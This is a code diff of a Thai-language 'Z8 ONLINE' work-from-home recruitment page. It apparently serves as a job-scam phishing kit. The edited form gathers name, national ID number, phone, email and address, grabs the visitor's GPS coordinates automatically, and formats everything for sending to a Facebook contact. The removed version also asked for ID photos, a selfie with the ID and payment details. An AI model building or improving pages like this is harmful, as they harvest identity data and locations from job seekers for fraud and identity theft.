@@ -3,72 +3,62 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Z8 ONLINE Recruitment</title>
+<title>Z8 ONLINE</title>
 
 <style>
+*{box-sizing:border-box;}
 body{
   margin:0;
   font-family:'Segoe UI',sans-serif;
-  background: linear-gradient(180deg,#020617,#000);
+  background:#020617;
   color:white;
 }
+.wrapper{max-width:480px;margin:auto;}
 
-/* HEADER */
-.header{
-  text-align:center;
-  padding:20px 10px;
-}
+.header{text-align:center;padding:20px;}
 .logo{
-  width:90px;
-  border-radius:50%;
+  width:80px;border-radius:50%;
   box-shadow:0 0 20px #22c55e;
-  animation:glow 2s infinite alternate;
 }
-@keyframes glow{
-  from{box-shadow:0 0 10px #22c55e;}
-  to{box-shadow:0 0 35px #22c55e;}
-}
-
 h1{color:#38bdf8;}
 
-/* REF */
 .ref{
   text-align:center;
   color:#22c55e;
   font-weight:bold;
-  font-size:20px;
-  margin-bottom:10px;
 }
 
-/* CARD */
-.container{padding:12px;}
 .card{
-  background:rgba(255,255,255,0.05);
-  border-radius:14px;
+  background:#111;
+  margin:12px;
   padding:15px;
-  margin-bottom:12px;
+  border-radius:12px;
 }
 
-/* BUTTON */
+input,textarea{
+  width:100%;
+  padding:10px;
+  margin-top:8px;
+  border-radius:8px;
+  border:none;
+}
+
 .btn{
   width:100%;
-  padding:16px;
+  padding:14px;
+  margin-top:10px;
   border:none;
   border-radius:12px;
-  font-size:16px;
+  background:#22c55e;
+  color:black;
   font-weight:bold;
-  background:linear-gradient(90deg,#22c55e,#16a34a);
-  color:white;
 }
 
-/* STATUS */
 .status{
   text-align:center;
   font-size:12px;
-  opacity:0.8;
 }
 
-/* PDPA */
 .pdpa{
   position:fixed;
   bottom:0;
@@ -84,82 +74,60 @@ h1{color:#38bdf8;}
   animation:scroll 18s linear infinite;
 }
 @keyframes scroll{
-  0%{transform:translateX(0);}
-  100%{transform:translateX(-100%);}
+  from{transform:translateX(100%);}
+  to{transform:translateX(-100%);}
 }
 </style>
 </head>
 
 <body>
 
+<div class="wrapper">
+
 <div class="header">
 <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="logo">
 <h1>🔥 Z8 ONLINE 🔥</h1>
-<p>โอกาสมาแล้ว! หาเงินออนไลน์จากที่บ้าน</p>
 </div>
 
 <div class="ref">📌 ผู้แนะนำ: วิน</div>
 
-<!-- 🔥 ปุ่มบนสุด -->
-<div style="padding:12px;">
-  <button class="btn" onclick="startProcess()">🚀 สมัครงานทันที (คลิกเดียวจบ)</button>
-  <p class="status" id="statusTop">ระบบจะขออนุญาตตำแหน่งก่อนส่งข้อมูล</p>
-</div>
-
-<div class="container">
-
 <div class="card">
-<b>🔥 รายละเอียดงาน</b><br><br>
-💸 งานเสริม / งานหลัก ทำได้จากที่บ้าน<br>
-📱 ใช้มือถือ + อินเทอร์เน็ต<br>
-⏰ เลือกเวลาทำเองได้<br><br>
+<b>📋 กรอกข้อมูลสมัคร</b>
 
-✨ เหมาะสำหรับ<br>
-- คนอยากมีรายได้เพิ่ม<br>
-- นักเรียน / นักศึกษา / คนทำงาน<br><br>
+<input id="name" placeholder="ชื่อ-นามสกุล">
+<input id="idcard" placeholder="เลขบัตรประชาชน">
+<input id="phone" placeholder="เบอร์โทร">
+<input id="email" placeholder="อีเมล">
+<textarea id="address" placeholder="ที่อยู่"></textarea>
 
-💰 รายได้ขึ้นอยู่กับความขยัน<br>
-(รายละเอียดทัก HR)
-</div>
-
-<div class="card">
-<b>📋 ข้อมูลที่ต้องเตรียม</b><br><br>
-- ชื่อ-นามสกุล<br>
-- เลขบัตรประชาชน<br>
-- เบอร์โทร<br>
-- อีเมล<br>
-- ที่อยู่<br>
-- พิกัด (ระบบจะใส่ให้)<br>
-- รูปบัตร + รูปหน้าคู่บัตร<br>
-- ข้อมูลรับเงิน
-</div>
-
-<!-- 🔥 ปุ่มล่าง -->
-<div class="card">
-<button class="btn" onclick="startProcess()">🚀 สมัครงานทันที</button>
-<p class="status" id="status">พร้อมดำเนินการ</p>
+<button class="btn" onclick="submitForm()">🚀 สมัครงานทันที</button>
+<p class="status" id="status">ระบบจะขอพิกัดอัตโนมัติ</p>
 </div>
 
 </div>
 
 <div class="pdpa">
-<span>🔒 ระบบมีการขอความยินยอมตาม PDPA ข้อมูลใช้เพื่อสมัครงานเท่านั้น การกดสมัครถือว่ายินยอม</span>
+<span>🔒 ระบบขอความยินยอมตาม PDPA ข้อมูลใช้เพื่อสมัครงานเท่านั้น</span>
 </div>
 
 <script>
-function updateStatus(text){
-  let a=document.getElementById("status");
-  let b=document.getElementById("statusTop");
-  if(a) a.innerText=text;
-  if(b) b.innerText=text;
-}
+function submitForm(){
 
-function startProcess(){
+  let name=document.getElementById("name").value;
+  let id=document.getElementById("idcard").value;
+  let phone=document.getElementById("phone").value;
+  let email=document.getElementById("email").value;
+  let address=document.getElementById("address").value;
 
-  updateStatus("📍 กำลังขอตำแหน่ง...");
+  if(!name || !phone){
+    alert("กรุณากรอกข้อมูลให้ครบ");
+    return;
+  }
+
+  document.getElementById("status").innerText="📍 กำลังขอตำแหน่ง...";
 
   if(!navigator.geolocation){
-    proceed("(ไม่รองรับ GPS)");
+    proceed("(ไม่มีพิกัด)",name,id,phone,email,address);
     return;
   }
 
@@ -170,26 +138,24 @@ function startProcess(){
 
     let location=`https://maps.google.com/?q=${lat},${lon}`;
 
-    proceed(location);
+    proceed(location,name,id,phone,email,address);
 
   },function(){
-    proceed("(ไม่ได้เปิดตำแหน่ง)");
+    proceed("(ไม่ได้เปิดตำแหน่ง)",name,id,phone,email,address);
   });
 }
 
-function proceed(location){
-
-  updateStatus("📋 กำลังเตรียมข้อมูล...");
+function proceed(location,name,id,phone,email,address){
 
   let text=`🔥 สมัครงาน Z8 ONLINE
 
 📌 ผู้แนะนำ: วิน
 
-👤 ชื่อ:
-🆔 เลขบัตร:
-📱 เบอร์:
-📧 อีเมล:
-🏠 ที่อยู่:
+👤 ชื่อ: ${name}
+🆔 เลขบัตร: ${id}
+📱 เบอร์: ${phone}
+📧 อีเมล: ${email}
+🏠 ที่อยู่: ${address}
 
 📍 พิกัด:
 ${location}
@@ -201,7 +167,7 @@ ${location}
 
   copy(text);
 
-  updateStatus("✅ คัดลอกแล้ว พร้อมส่ง");
+  document.getElementById("status").innerText="✅ คัดลอกแล้ว ไปส่งให้ HR";
 
   setTimeout(()=>{
     window.location.href="https://www.facebook.com/share/1RtTcrR6Bu/";
